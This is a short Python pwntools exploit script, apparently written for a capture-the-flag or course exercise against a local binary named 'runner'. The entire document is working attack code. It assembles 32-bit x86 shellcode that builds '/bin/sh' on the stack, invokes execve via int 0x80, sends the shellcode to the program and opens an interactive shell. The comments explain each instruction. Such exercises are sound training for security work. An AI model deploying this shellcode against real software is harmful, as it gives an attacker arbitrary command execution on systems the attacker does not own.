from pwn import *
from lib import *

# additional question

p, elf = start('./runner', args)

# "/bin/sh\x00" = 2f 62 69 6e 2f 73 68 00
payload = asm("""
    push 0x0068732f # /sh[NULL] (actually [NULL]hs/)
    push 0x6e69622f # /bin      (actually nib/)

    mov ebx, esp    # ebx = &('/bin/sh[NULL]')
    mov eax, 0xb    # eax = 0xb (execve)
    xor ecx, ecx    # ecx = 0 (NULL)
    xor edx, edx    # edx = 0 (NULL)
    xor esi, esi    # esi = 0 (NULL)

    int 0x80
""")

p.sendlineafter(b'that\n', payload)

p.interactive()
p.close()